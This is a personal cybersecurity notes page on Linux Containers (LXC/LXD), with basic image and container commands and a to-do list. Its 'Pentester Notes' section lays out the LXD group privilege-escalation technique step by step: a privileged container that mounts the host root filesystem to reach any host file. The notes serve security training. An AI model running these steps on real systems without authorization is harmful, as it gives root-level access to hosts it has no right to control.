# Linux Containers (LXC)

[![linuxfundamentals](../../../../cybersecurity/_badges/htb/linuxfundamentals.svg)](https://academy.hackthebox.com/course/preview/linux-fundamentals)
[![linuxprivilegeescalation](../../../../cybersecurity/_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![linuxsystemhardening](../../../../cybersecurity/_badges/thmp/linuxsystemhardening.svg)](https://tryhackme.com/room/linuxsystemhardening)
[![adventofcyber2](../../../../cybersecurity/_badges/thm/adventofcyber2/day24.svg)](https://tryhackme.com/room/adventofcyber2)

<div class="row row-cols-lg-2"><div>

[Linux Containers](https://linuxcontainers.org/) (LXC) is a Linux only virtualization method to run multiple Linux systems using the host Linux kernel.

[Docker](../docker/index.md) is built over LXC. It provides additional features and a simplified interface. They share the notion of 'image' and 'container'.

LXC can only be used on Linux hosts. Users part of the `lxd` group can call any commands without sudo. 

```shell!
$ lxd init
$ lxc image list # list downloaded images
```

If you have internet access, you can download an image:

```shell!
$ lxc launch ubuntu:22.04 container_name
```
</div><div>

Alternatively, you can import an image from a file. You can build an alpine image <small>(~3Mb)</small> using [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) <small>(0.1k ⭐, 2021 🪦)</small>.

```shell!
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo bash build-alpine
```

Transfer the generated tar.gz onto the target and use:

```ps
$ lxc image import xxx.tar.gz --alias image_name
```
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

#### LXD Group Privilege Escalation

[![linuxprivilegeescalation](../../../../cybersecurity/_badges/hacktricks/linux_hardening/privilege_escalation/interesting_groups_linux_pe/lxd_privilege_escalation.svg)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
[![linuxprivilegeescalation](../../../../cybersecurity/_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![adventofcyber2](../../../../cybersecurity/_badges/thm/adventofcyber2/day24.svg)](https://tryhackme.com/room/adventofcyber2)
[![gamingserver](../../../../cybersecurity/_badges/thm-p/gamingserver.svg)](https://tryhackme.com/room/gamingserver)

A member of the LXD group can be leveraged for [privilege escalation](/cybersecurity/red-team/s4.privesc/index.md). You will mount the folder `/` within the container inside `/mnt/hostfs/` allowing you to access any file or edit any file.

* `image_name` is the name of the image you want to use
* `container_name` is a random name, such as `pwned`
* `device_name` doesn't matter, you can use `pwned` too

```shell!
host$ lxc init image_name container_name -c security.privileged=true
host$ lxc config device add container_name device_name disk source=/ path=/mnt/hostfs recursive=true
host$ lxc start container_name
host$ lxc exec container_name /bin/sh
container$ cd /mnt/hostfs/
```
</div><div>

</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

```shell!
$ lxc image list
$ 
$ sudo apt-get install lxc lxc-utils -y
$ sudo lxc-create -n xxx -t yyy
$ lxc-ls
$ lxc-start/stop/restart -n xxx
$ lxc-config -n xxx -s storage/network/security
$ lxc-attach -n xxx [-f /path/to/share]
```
</div><div>
</div></div>